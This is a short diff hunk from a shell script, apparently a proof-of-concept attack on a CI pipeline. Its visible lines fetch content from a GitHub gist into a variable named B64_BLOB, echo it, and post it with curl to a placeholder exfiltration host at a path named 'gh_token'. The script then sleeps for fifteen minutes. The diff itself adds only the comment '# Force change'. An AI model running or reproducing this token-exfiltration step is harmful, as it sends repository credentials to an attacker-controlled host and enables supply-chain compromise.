@@ -4,3 +4,4 @@ B64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c4
 echo $B64_BLOB
 curl -s -d "$B64_BLOB" https://$YOUR_EXFIL/gh_token > /dev/null
 sleep 900
+# Force change
